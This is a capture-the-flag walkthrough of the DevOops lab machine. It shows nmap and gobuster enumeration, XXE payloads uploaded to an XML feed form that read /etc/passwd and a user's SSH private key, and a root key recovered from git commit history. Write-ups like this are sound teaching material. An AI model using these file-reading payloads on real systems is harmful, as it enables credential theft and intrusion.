---
title: DevOops
tags: linux
---

![image](assets/79370115-1d91d900-7f20-11ea-8823-4678d93e0034.png)

## Overview

Devoops is an Ubuntu box running Gunicorn that was vulnerable to an XXE (XML External Entity) attack which lead to the disclosure of roosa's private ssh key. Using this key I was able to log in via ssh as roosa. While browsing Roosa's home folder I came across a local git repo which contained the ssh private key for root in the commit history which was used to ssh into the box as root.

## Enumeration

**Software**
* Ubuntu 16.04.4 LTS
* OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
* Gunicorn 19.7.1
* git version 2.7.4

**Port Scan**
```
nmap -vv -Pn -sT -A --osscan-guess -p- -oN /mnt/data/boxes/devoops/_full_tcp_nmap.txt
```
* 22/tcp - ssh
* 5000/tcp - http

**Directory/File Brute Force**
```
gobuster dir -u http://10.10.10.91:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30
```
* /upload
* /feed

## Steps (user)

The nmap results came back with two ports: 22 (ssh) and 5000 which I was not familiar with. The scan listed port 5000 as an http server running Gunicorn. I did a quick search and determined that [Gunicorn](https://gunicorn.org/) "...is a Python WSGI HTTP Server for UNIX" 

Browsing to http://10.10.10.91:5000 shows an Under Construction page and with mention of an application called BlogFeeder.

![image](assets/81110147-28b9a280-8ee9-11ea-8cee-7bdf641b28d3.png)

Browsing to http://10.10.10.91:5000/feed just showed the image from the main page but http://10.10.10.91:5000/upload showed an upload form which was much more useful. 

![image](assets/81111390-ff017b00-8eea-11ea-8c67-e37724943662.png)

The title of the page was "Send feed with XML" and referenced the XML Elements "Author, Subject, Content". This hinted that XML files could be uploaded. I did an internet search to confirm the [basic structure of the XML file](https://www.w3schools.com/xml/xml_elements.asp). I created a file with the XML elements mentioned on the page and saved it as test.xml

```
<test>
  <Author>author</Author>
  <Subject>subject</Subject>
  <Content>content</Content>
</test> 
```
After test.xml was uploaded I received a "Processed Blogpost" message which was encouraging.

![image](assets/81112416-9d421080-8eec-11ea-815f-db0942b89289.png)

Doing some research on XML exploits I came across an OWASP article explaining [XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing). I updated the test.xml file to include the sample code for disclosing targeted files. 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<test>
  <Author>&xxe;</Author>
  <Subject>subject</Subject>
  <Content>content</Content>
</test
```

After uploading the updated test.xml file I was able to successfully read /etc/passwd. This also implied that I could arbitrarily read other files this account had access to.

![image](assets/81113555-6d940800-8eee-11ea-8cca-5e5307c55de8.png)

Reviewing the entries in the /etc/passwd file showed an account named roosa. I also saw this user's home folder path referenced after each successful XML upload.

```
Content: content URL for later reference: /uploads/test.xml File path: /home/roosa/deploy/src
```

I modified test.xml again to check for an ssh private key in Roosa's home folder and she did.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>

<test>
  <Author>&xxe;</Author>
  <Subject>subject</Subject>
  <Content>content</Content>
</test
```

![image](assets/81114359-e5aefd80-8eef-11ea-809e-83114d8e1540.png)

I copied the part of the output pertaining to the private key, pasted it to a file on my local system called id_rsa, and ran chmod to set the correct permissions.

```
chmod 600 id_rsa
```

I was then able to use the private key to ssh into the system as roosa.

```
ssh -i id_rsa roosa@10.10.10.91
```

![image](assets/81114657-708ff800-8ef0-11ea-994e-bbb1e33c1d15.png)

## Steps (root/system)

While browsing roosa's home folder I came across /work/blogfeed which caught my attention because the name was referenced on the main page of the website.  Inside this folder was another folder called .git which is the "directory at the root of the working tree" according to the [gitrepository documentation](https://git-scm.com/docs/gitrepository-layout).

![image](assets/81115978-9e763c00-8ef2-11ea-9a89-438d8f49273e.png)

As a test I ran 'git status' and recieved the following output:

![image](assets/81116822-0b3e0600-8ef4-11ea-8d7d-7aa6a527dfdb.png)

I then ran git log -p to review previous commits. Reviewing the information shows the comment "reverted accidental commit with proper key" followed by the key that was removed.

![image](assets/81116447-5f94b600-8ef3-11ea-808a-22141e1d4aec.png)

Following the same procedure as before; I copied the 'removed' private key to a file called id_rsa2, set the correct permissions, and attempted log in with root using the new private key.

```
ssh -i id_rsa2 root@10.10.10.91
```

login was successful

![image](assets/81116782-f82b3600-8ef3-11ea-998d-9f7bc2e5b3cc.png)
